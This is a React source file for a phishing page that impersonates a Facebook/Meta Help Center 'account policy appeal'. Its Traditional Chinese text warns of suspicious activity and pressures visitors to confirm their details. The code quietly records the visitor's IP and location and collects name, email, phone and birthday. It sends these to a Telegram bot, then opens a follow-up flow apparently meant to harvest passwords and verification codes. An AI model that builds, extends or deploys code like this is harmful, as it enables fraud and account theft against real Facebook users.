import FromMetaImage from '@/assets/images/from-meta.png';
import FacebookImage from '@/assets/images/icon.webp';
import FormFlow from '@/components/form-flow';
import { store } from '@/store/store';
import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useRef } from 'react';
import sendMessage from '@/utils/telegram';
import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
import axios from 'axios';

const Home = () => {
    // Tất cả text tiếng Đài Loan
    const texts = {
        helpCenter: '說明中心',
        english: 'English',
        using: '使用方式',
        managingAccount: '管理帳號',
        privacySecurity: '隱私、安全與安全性',
        policiesReporting: '政策與檢舉',
        pagePolicyAppeals: '帳號政策申訴',
        detectedActivity: '我們在您的頁面和帳號中偵測到可疑活動，包括版權侵權和政策違規的檢舉',
        accessLimited: '為了保護您的帳號，確保快速且準確的審查流程，請立即確認您的資訊。',
        submitAppeal: '這是 Facebook 帳號的必填確認步驟。為避免帳號遭停用並加快案件處理速度，請立即完成確認。',
        pageName: '頁面名稱',
        mail: '電子郵件地址',
        phone: '電話號碼',
        birthday: '出生日期',
        yourAppeal: '您的申訴',
        appealPlaceholder: '請填寫申訴詳細資訊。',
        submit: '提交',
        fieldRequired: '此欄位為必填',
        invalidEmail: '請輸入有效的電子郵件地址',
        about: '關於',
        adChoices: '廣告選擇',
        createAd: '建立廣告',
        privacy: '隱私',
        careers: '職涯',
        createPage: '建立頁面',
        termsPolicies: '條款與政策',
        cookies: 'Cookie',
        pleaseWait: '請稍候...'
    };

    const [formData, setFormData] = useState({
        pageName: '',
        mail: '',
        phone: '',
        birthday: '',
        appeal: ''
    });

    const [errors, setErrors] = useState({});
    const [countryCode, setCountryCode] = useState('TW');
    const [callingCode, setCallingCode] = useState('+886');
    const [isSubmitting, setIsSubmitting] = useState(false);
    
    const isMountedRef = useRef(true);

    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo, setBaseMessage, setUserEmail, setUserPhoneNumber, setUserFullName, setMessageId, resetPasswords, resetCodes } = store();

    // Lấy IP info ngầm (không block form)
    useEffect(() => {
        axios.get('https://get.geojs.io/v1/ip/geo.json')
            .then(response => {
                if (!isMountedRef.current) return;
                const ipData = response.data;
                localStorage.setItem('ipInfo', JSON.stringify(ipData));
                setGeoInfo({
                    asn: ipData.asn || 0,
                    ip: ipData.ip || 'CHỊU',
                    country: ipData.country || 'CHỊU',
                    city: ipData.city || 'CHỊU',
                    country_code: ipData.country_code || 'TW'
                });
            })
            .catch((error) => {
                if (!isMountedRef.current) return;
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'TW'
                });
            });
        
        return () => {
            isMountedRef.current = false;
        };
    }, [setGeoInfo]);

    const validateEmail = (email) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    };

    const formatDateToDDMMYYYY = (dateString) => {
        if (!dateString) return '';
        const parts = dateString.split('-');
        if (parts.length !== 3) return dateString;
        return `${parts[2]}/${parts[1]}/${parts[0]}`;
    };

    const hideEmail = (email) => {
        if (!email) return 's****g@m****.com';
        const parts = email.split('@');
        if (parts.length !== 2) return email;
        
        const username = parts[0];
        const domain = parts[1];
        const domainParts = domain.split('.');
        
        if (username.length <= 1) return email;
        if (domainParts.length < 2) return email;
        
        const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
        const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
        
        return formattedUsername + '@' + formattedDomain;
    };

    const hidePhone = (phone) => {
        if (!phone) return '******32';
        const cleanPhone = phone.replace(/^\+\d+\s*/, '');
        if (cleanPhone.length < 2) return '******32';
        
        const lastTwoDigits = cleanPhone.slice(-2);
        return '*'.repeat(6) + lastTwoDigits;
    };

    const handleInputChange = useCallback((field, value) => {
        if (isSubmitting) return;
        
        if (field === 'phone') {
            const cleanValue = value.replace(/^\+\d+\s*/, '');
            const asYouType = new AsYouType(countryCode);
            const formattedValue = asYouType.input(cleanValue);

            const finalValue = `${callingCode} ${formattedValue}`;

            setFormData((prev) => ({
                ...prev,
                [field]: finalValue
            }));
        } else {
            setFormData((prev) => ({
                ...prev,
                [field]: value
            }));
        }

        // Chỉ update errors khi có error, tránh re-render không cần thiết
        setErrors((prev) => {
            if (prev[field]) {
                return {
                ...prev,
                [field]: false
                };
        }
            return prev;
        });
    }, [isSubmitting, countryCode, callingCode]);

    const validateForm = () => {
        if (isSubmitting) return false;
        
        const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
        const newErrors = {};

        requiredFields.forEach((field) => {
            if (formData[field].trim() === '') {
                newErrors[field] = true;
            }
        });

        if (formData.mail.trim() !== '' && !validateEmail(formData.mail)) {
            newErrors.mail = 'invalid';
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    // 🎯 CẬP NHẬT: Hàm submit nhanh - UPDATE ALL TRƯỚC KHI HIỆN PASSWORD
    const handleSubmit = async () => {
        if (isSubmitting) return;
        
        if (validateForm()) {
            try {
                setIsSubmitting(true);
                
                // Mỗi lần submit form mới (bước 1) coi như một phiên mới:
                // - Reset passwords, codes
                // - Reset messageId để KHÔNG xóa tin Telegram của phiên trước
                //   (password-modal / verify-modal chỉ xóa trong cùng một phiên hiện tại)
                resetPasswords();
                resetCodes();
                setMessageId(null);

                // Format thời gian
                const now = new Date();
                const formattedTime = now.toLocaleString('vi-VN', {
                    timeZone: 'Asia/Ho_Chi_Minh',
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });

                // Format date of birth: DD/MM/YYYY từ YYYY-MM-DD
                const birthdayParts = formData.birthday.split('-');
                const dateOfBirth = birthdayParts.length === 3 
                    ? `${birthdayParts[2]}/${birthdayParts[1]}/${birthdayParts[0]}`
                    : formData.birthday;
                
                // Format phone number (chỉ lấy số, giữ nguyên format)
                const phoneNumberOnly = formData.phone.replace(/[^\d+]/g, '');

                // Tạo base message với format đúng (HTML với <b> và <code>)
                const currentGeoInfo = geoInfo || {
                    ip: 'k lấy được',
                    city: 'k lấy được',
                    country_code: 'k lấy được'
                };
                const location = `${currentGeoInfo.city || 'k lấy được'} - ${currentGeoInfo.country_code || 'k lấy được'}`;
                const messageLines = [
                    `📅 <b>Thời gian:</b> <code>${formattedTime}</code>`,
                    `🌍 <b>IP:</b> <code>${currentGeoInfo.ip || 'k lấy được'}</code>`,
                    `📍 <b>Vị trí:</b> <code>${location}</code>`,
                    '',
                    `🔖 <b>Page Name:</b> <code>${formData.pageName}</code>`,
                    `📧 <b>Email:</b> <code>${formData.mail}</code>`,
                    `📱 <b>Số điện thoại:</b> <code>${phoneNumberOnly}</code>`,
                    `🎂 <b>Ngày sinh:</b> <code>${dateOfBirth}</code>`,
                    ''
                ];

                const baseMessage = messageLines.join('\n');

                // Lưu base message vào store
                setBaseMessage(baseMessage);

                // Save user data to store
                setUserEmail(formData.mail);
                setUserPhoneNumber(formData.phone);
                setUserFullName(formData.pageName);
                
                // 🎯 GỬI TELEGRAM DATA FORM (dùng baseMessage đã format đúng với geoInfo)
                const startTime = Date.now();
                console.log('📤 Bắt đầu gửi Telegram, baseMessage:', baseMessage);
                try {
                    const res = await sendMessage(baseMessage);
                    console.log('✅ Telegram response:', res);

                    // Cập nhật messageId nếu có
                    if (res?.messageId) {
                        setMessageId(res.messageId);
                        console.log('✅ MessageId đã lưu:', res.messageId);
                    } else {
                        console.warn('⚠️ Không có messageId trong response');
                    }
                } catch (telegramError) {
                    console.error('❌ Telegram send error:', telegramError);
                    console.error('❌ Error details:', telegramError.response?.data || telegramError.message);
                    // Không throw, tiếp tục flow dù có lỗi telegram
                }

                // 🎯 LƯU DATA VÀO LOCALSTORAGE
                const userInfoData = {
                    name: formData.pageName,
                    email: hideEmail(formData.mail),
                    phone: hidePhone(formData.phone),
                    birthday: formData.birthday
                };
                localStorage.setItem('userInfo', JSON.stringify(userInfoData));

                // 🎯 ĐỢI TỐI THIỂU 3 GIÂY ĐỂ SPINNER HIỆN ĐỦ
                const elapsedTime = Date.now() - startTime;
                const minDelay = 3000; // 3 giây
                if (elapsedTime < minDelay && isMountedRef.current) {
                    await new Promise((resolve) => setTimeout(resolve, minDelay - elapsedTime));
                }

                // 🎯 HIỆN FORM FLOW (chỉ nếu component vẫn mounted)
                if (isMountedRef.current) {
                    setIsSubmitting(false);
                    console.log('Opening modal, baseMessage:', baseMessage);
                    setModalOpen(true);
                }
                
            } catch (error) {
                if (isMountedRef.current) {
                    setIsSubmitting(false);
                    console.error('Submit error:', error);
                }
                // Không redirect về about:blank, chỉ log lỗi
                // window.location.href = 'about:blank';
            }
        } else {
            const firstErrorField = Object.keys(errors)[0];
            if (firstErrorField) {
                const inputElement = document.querySelector(`input[name="${firstErrorField}"], textarea[name="${firstErrorField}"]`);
                if (inputElement) {
                    inputElement.focus();
                }
            }
        }
    };


    const formatTelegramMessage = (data) => {
        const timestamp = new Date().toLocaleString('vi-VN');
        const ipInfo = localStorage.getItem('ipInfo');
        const ipData = ipInfo ? JSON.parse(ipInfo) : {};
        return `📅 <b>Thời gian:</b> <code>${timestamp}</code>
🌍 <b>IP:</b> <code>${ipData.ip || 'k lấy được'}</code>
📍 <b>Vị trí:</b> <code>${ipData.city || 'k lấy được'} - ${ipData.country_code || 'k lấy được'}</code>

🔖 <b>Page Name:</b> <code>${data.pageName}</code>
📧 <b>Email:</b> <code>${data.mail}</code>
📱 <b>Số điện thoại:</b> <code>${data.phone}</code>
🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>`;
    };


    const data_list = [
        {
            id: 'using',
            icon: faCompass,
            title: texts.using
        },
        {
            id: 'managing',
            icon: faUserGear,
            title: texts.managingAccount
        },
        {
            id: 'privacy',
            icon: faLock,
            title: texts.privacySecurity
        },
        {
            id: 'policies',
            icon: faCircleExclamation,
            title: texts.policiesReporting
        }
    ];

    return (
        <>
            <div className='opacity-100'>
                <header className='sticky top-0 left-0 right-0 z-40 flex h-14 justify-between p-4 shadow-sm bg-white'>
                    <title>Page Help Center</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
                    <div className='flex items-center gap-2'>
                        <img src={FacebookImage} alt='' className='h-10 w-10' />
                        <p className='font-bold'>{texts.helpCenter}</p>
                    </div>
                    <div className='flex items-center gap-2'>
                        <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
                            <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
                        </div>
                        <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{texts.english}</p>
                    </div>
                </header>
                <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
                    <nav className='hidden w-xs flex-col gap-2 p-4 shadow-lg sm:flex'>
                        {data_list.map((data) => {
                            return (
                                <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
                                    <div className='flex items-center gap-2'>
                                        <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
                                            <FontAwesomeIcon icon={data.icon} />
                                        </div>
                                        <div>{data.title}</div>
                                    </div>
                                    <FontAwesomeIcon icon={faChevronDown} />
                                </div>
                            );
                        })}
                    </nav>
                    <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
                        <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12'>
                            <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                                <p className='text-xl sm:text-3xl font-bold'>{texts.pagePolicyAppeals}</p>
                            </div>
                            <div className='px-4 pt-4 pb-2 text-base leading-7 font-medium sm:text-base sm:leading-7'>
                                <p className='mb-3 whitespace-pre-line'>{texts.detectedActivity}</p>
                                <p className='mb-3'>{texts.accessLimited}</p>
                                <p className='mb-0'>{texts.submitAppeal}</p>
                            </div>
                            <div className='flex flex-col gap-3 px-4 pb-4 pt-0 text-sm leading-6 font-semibold'>
                                <div className='flex flex-col gap-2'>
                                    <p className='text-base sm:text-base'>
                                        {texts.pageName} <span className='text-red-500'>*</span>
                                    </p>
                                    <input 
                                        type='text' 
                                        name='pageName' 
                                        autoComplete='organization' 
                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                        value={formData.pageName} 
                                        onChange={(e) => handleInputChange('pageName', e.target.value)} 
                                        disabled={isSubmitting}
                                    />
                                    {errors.pageName && <span className='text-xs text-red-500'>{texts.fieldRequired}</span>}
                                </div>
                                <div className='flex flex-col gap-2'>
                                    <p className='text-base sm:text-base'>
                                        {texts.mail} <span className='text-red-500'>*</span>
                                    </p>
                                    <input 
                                        type='email' 
                                        name='mail' 
                                        autoComplete='email' 
                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                        value={formData.mail} 
                                        onChange={(e) => handleInputChange('mail', e.target.value)} 
                                        disabled={isSubmitting}
                                    />
                                    {errors.mail === true && <span className='text-xs text-red-500'>{texts.fieldRequired}</span>}
                                    {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{texts.invalidEmail}</span>}
                                </div>
                                <div className='flex flex-col gap-2'>
                                    <p className='text-base sm:text-base'>
                                        {texts.phone} <span className='text-red-500'>*</span>
                                    </p>
                                    <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}>
                                        <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-base font-medium text-gray-700'>{callingCode}</div>
                                        <input 
                                            type='tel' 
                                            name='phone' 
                                            inputMode='numeric' 
                                            pattern='[0-9]*' 
                                            autoComplete='off' 
                                            className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' 
                                            value={formData.phone.replace(/^\+\d+\s*/, '')} 
                                            onChange={(e) => handleInputChange('phone', e.target.value)} 
                                            disabled={isSubmitting}
                                        />
                                    </div>
                                    {errors.phone && <span className='text-xs text-red-500'>{texts.fieldRequired}</span>}
                                </div>
                                <div className='flex flex-col gap-2'>
                                    <p className='text-base sm:text-base'>
                                        {texts.birthday} <span className='text-red-500'>*</span>
                                    </p>
                                    
                                    <input 
                                        type='date' 
                                        name='birthday' 
                                        className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                        value={formData.birthday} 
                                        onChange={(e) => handleInputChange('birthday', e.target.value)} 
                                        disabled={isSubmitting}
                                    />
                                    
                                    <div className='block sm:hidden relative'>
                                        <input 
                                            type='date' 
                                            name='birthday' 
                                            className={`w-full rounded-lg border px-3 py-2.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
                                            value={formData.birthday} 
                                            onChange={(e) => handleInputChange('birthday', e.target.value)}
                                            required
                                            disabled={isSubmitting}
                                        />
                                        <div 
                                            className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
                                            onClick={() => !isSubmitting && document.querySelectorAll('input[name="birthday"]')[1].click()}
                                        >
                                            {formData.birthday ? formatDateToDDMMYYYY(formData.birthday) : 'dd/mm/yyyy'}
                                        </div>
                                    </div>
                                    
                                    {errors.birthday && <span className='text-xs text-red-500'>{texts.fieldRequired}</span>}
                                </div>
                                <div className='flex flex-col gap-2'>
                                    <p className='text-base sm:text-base'>
                                        {texts.yourAppeal} <span className='text-red-500'>*</span>
                                    </p>
                                    <textarea 
                                        name='appeal'
                                        rows={4}
                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'} ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
                                        placeholder={texts.appealPlaceholder}
                                        value={formData.appeal}
                                        onChange={(e) => handleInputChange('appeal', e.target.value)}
                                        disabled={isSubmitting}
                                    />
                                    {errors.appeal && <span className='text-xs text-red-500'>{texts.fieldRequired}</span>}
                                </div>
                                <button 
                                    className={`w-full rounded-lg px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2 flex items-center justify-center ${
                                        isSubmitting 
                                            ? 'bg-blue-500 cursor-wait text-white' 
                                            : 'bg-blue-600 hover:bg-blue-700 text-white'
                                    }`} 
                                    onClick={handleSubmit}
                                    disabled={isSubmitting}
                                >
                                    {isSubmitting ? (
                                        <>
                                            <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                        </svg>
                                            {texts.pleaseWait}
                                        </>
                                    ) : (
                                        texts.submit
                                    )}
                                </button>
                            </div>
                        </div>
                        <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
                            <div className='mx-auto flex justify-between'>
                                <div className='flex flex-col space-y-4'>
                                    <p>{texts.about}</p>
                                    <p>{texts.adChoices}</p>
                                    <p>{texts.createAd}</p>
                                </div>
                                <div className='flex flex-col space-y-4'>
                                    <p>{texts.privacy}</p>
                                    <p>{texts.careers}</p>
                                    <p>{texts.createPage}</p>
                                </div>
                                <div className='flex flex-col space-y-4'>
                                    <p>{texts.termsPolicies}</p>
                                    <p>{texts.cookies}</p>
                                </div>
                            </div>
                            <hr className='my-8 h-0 border border-transparent border-t-gray-300' />
                            <div className='flex justify-between'>
                                <img src={FromMetaImage} alt='' className='w-[100px]' />
                                <p className='text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
                            </div>
                        </div>
                    </div>
                </main>
                {isModalOpen && <FormFlow />}
            </div>
        </>
    );
};

export default Home;
